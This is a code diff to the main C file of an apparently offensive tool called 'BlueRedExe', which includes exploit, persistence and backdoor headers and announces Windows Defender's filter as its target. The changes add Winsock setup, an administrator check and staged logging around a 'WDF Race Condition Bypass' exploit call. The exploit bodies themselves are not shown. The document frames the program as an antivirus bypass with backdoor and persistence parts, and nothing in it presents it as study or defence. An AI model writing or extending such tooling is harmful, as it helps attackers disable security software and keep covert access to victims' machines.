@@ -1,20 +1,37 @@
 #include "../include/config.h"
+#include "../include/winsock_admin.h"
 #include "exploit.h"
 #include "persistence.h"
 #include "backdoor.h"
-#include <conio.h>  // For _getch() if needed
 
 int main(void) {
+    // 1. Initialize Winsock
+    InitializeWinsock();
+    if (wsaInitResult != 0) {
+        printf("[DEBUG] WSAStartup failed: %lu\n", (unsigned long)wsaInitResult);
+        fflush(stdout);
+    }
+
     printf("=== BlueRedExe v1.0 Started ===\n");
     printf("Target: Windows Defender / WDF Filter (CVE-2026-33825 Variant)\n");
-    fflush(stdout); // Flush output
+    fflush(stdout);
+
+    // 2. Check Admin Rights
+    if (IsAdmin()) {
+        printf("[DEBUG] Running as Administrator - Good\n");
+        fflush(stdout);
+        Sleep(2000);
+    } else {
+        printf("[DEBUG] Running as Standard User - Some registry functions may fail\n");
+        fflush(stdout);
+        Sleep(2000);
+    }
 
     printf("\n--- Stage 1: WDF Race Condition Bypass ---\n");
     fflush(stdout);
 
     if (!ExecuteExploitLogic()) {
         printf("[EXPLOIT] Stage 1 failed or timed out.\n");
-        printf("[EXPLOIT] Check WDF filters and retry.\n");
         fflush(stdout);
         Sleep(3000);
         return 1;
